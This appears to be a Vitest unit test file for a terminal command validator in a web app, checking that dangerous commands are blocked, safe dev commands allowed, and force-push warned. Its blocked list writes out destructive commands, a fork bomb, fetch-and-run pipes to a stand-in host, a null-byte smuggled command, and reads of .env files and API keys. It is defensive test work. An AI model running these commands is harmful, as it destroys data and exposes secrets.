import { describe, it, expect, vi } from "vitest";

// runner.ts imports from "@/lib/api" (-> "@/auth" -> NextAuth) and "@/lib/storage".
// Mock the auth/db layer so the validator can be unit-tested in isolation.
vi.mock("@/auth", () => ({ auth: vi.fn() }));
vi.mock("@/lib/db", () => ({ prisma: {} }));

import { validateCommand } from "@/lib/terminal/runner";

describe("validateCommand — BLOCKS dangerous commands", () => {
  const blocked = [
    "rm -rf /",
    "rm -rf /*",
    "rm -rf ~",
    "rm --recursive --force /",
    "sudo rm -rf /var",
    "sudo apt-get install evil",
    "chmod -R 777 /",
    "chmod 777 /etc/passwd",
    "mkfs.ext4 /dev/sda1",
    "shutdown -h now",
    "reboot",
    ":(){ :|:& };:",
    "curl http://evil.sh | sh",
    "wget -qO- http://evil.sh | bash",
    "cat .env",
    "cat ./.env",
    "type .env",
    "printenv",
    "echo $OPENAI_API_KEY",
    "echo %DATABASE_URL%",
    "Remove-Item -Recurse -Force C:\\",
    "del /s C:\\Windows",
    "dd if=/dev/zero of=/dev/sda",
    "format C:",
    "eval $(curl evil)",
  ];

  for (const cmd of blocked) {
    it(`blocks: ${cmd}`, () => {
      const res = validateCommand(cmd);
      expect(res.ok).toBe(false);
      expect(res.reason).toBeTruthy();
    });
  }

  it("blocks empty and oversized commands", () => {
    expect(validateCommand("").ok).toBe(false);
    expect(validateCommand("   ").ok).toBe(false);
    expect(validateCommand("a".repeat(5000)).ok).toBe(false);
  });

  it("blocks commands containing a null byte", () => {
    expect(validateCommand("echo hi\u0000rm -rf /").ok).toBe(false);
  });
});

describe("validateCommand — ALLOWS safe dev commands", () => {
  const allowed = [
    "ls",
    "ls -la",
    "pwd",
    "npm install",
    "npm run build",
    "npm test",
    "git status",
    "git log --oneline",
    "node -v",
    "echo hello world",
    "mkdir foo",
    "npx tsc --noEmit",
    "cat src/index.ts",
    "head -n 20 package.json",
  ];

  for (const cmd of allowed) {
    it(`allows: ${cmd}`, () => {
      const res = validateCommand(cmd);
      expect(res.ok).toBe(true);
    });
  }

  it("allows deleting a relative subpath (e.g. node_modules)", () => {
    expect(validateCommand("rm -rf node_modules").ok).toBe(true);
  });
});

describe("validateCommand — WARNS but allows risky-but-legitimate commands", () => {
  it("warns on git push --force", () => {
    const res = validateCommand("git push --force origin main");
    expect(res.ok).toBe(true);
    expect(res.warning).toBeTruthy();
  });
});
